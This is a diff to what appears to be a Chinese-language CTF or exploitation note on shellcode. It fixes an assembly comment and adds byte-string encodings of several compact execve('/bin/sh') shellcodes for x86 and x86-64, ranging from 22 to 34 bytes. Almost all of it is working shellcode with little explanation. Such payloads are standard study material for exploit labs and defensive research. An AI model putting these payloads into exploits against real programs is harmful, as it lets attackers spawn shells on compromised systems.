@@ -51,7 +51,7 @@ push 0x6e69622f	;push '/bin'
 mov ebx, esp	;ebx='/bin/sh'
 xor edx, edx	;edx=0
 xor ecx, ecx	;ecx=0
-mov eax, 0xb	eax=0xb
+mov eax, 0xb	;eax=0xb
 int 0x80
 ```
 
@@ -68,6 +68,7 @@ push rsp
 pop rdi
 mov al, 59
 syscall
+# shellcode = b'H1\xf6\xf7\xe6H\xbb/bin/sh\x00ST_\xb0;\x0f\x05'
 ```
 
 ### 无"\x00" 最短23 byte
@@ -82,6 +83,7 @@ push rsp
 pop rdi
 mov al, 59
 syscall
+# shellcode = b'H1\xf6\xf7\xe6PH\xbb/bin//shST_\xb0;\x0f\x05'
 ```
 
 ### 标准shellcode 31 byte
@@ -97,9 +99,10 @@ push   rbx
 mov    rdi,rsp
 mov    al,0x3b
 syscall
+# shellcode = b'H1\xffH1\xf6H1\xd2H1\xc0PH\xbb/bin//shSH\x89\xe7\xb0;\x0f\x05'
 ```
 
-### ret2shellcode
+### ret2shellcode 22byte
 
 ```assembly
 shellcode = '''
@@ -118,16 +121,21 @@ syscall
 # shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
 ```
 
-### 此外
+### 其它 34byte
 
 ```assembly
-mov rbx, '/bin/sh'	;将'/bin/sh'赋值给rbx
-push rbx	;将rbx的值，即'/bin/sh'压入栈中
-push rsp	;将esp的值压入栈中
-pop rdi		;将esp赋值给rdi，rdi='/bin/sh'
-xor rsi, rsi	;rsi=0
-xor rdx, rdx	;rdx=0
-mov rax, 0x3b	;rax=0x3b
+xor    rax, rax
+add    rax, 0x3b
+xor    rdi, rdi
+push   rdi
+movabs rdi, 0x68732f2f6e69622f
+push   rdi
+lea    rdi, [rsp]
+xor    rsi, rsi
+xor    rdx, rdx
 syscall
+# shellcode = b'\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05'
 ```
+
+
 
